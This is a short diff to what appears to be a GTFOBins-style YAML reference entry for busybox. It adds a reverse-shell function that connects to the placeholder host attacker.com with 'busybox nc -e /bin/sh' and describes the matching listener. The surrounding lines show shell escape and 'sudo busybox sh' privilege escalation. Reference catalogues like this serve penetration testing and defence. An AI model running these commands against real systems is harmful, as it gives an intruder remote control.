@@ -21,4 +21,10 @@ functions:
       code: "./busybox sh"
   sudo:
     - code: sudo busybox sh
+  reverse-shell:
+    - description: Run `nc -lvp 12345` on the attacker box to receive the shell.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        busybox nc -e /bin/sh $RHOST $RPORT
 ---
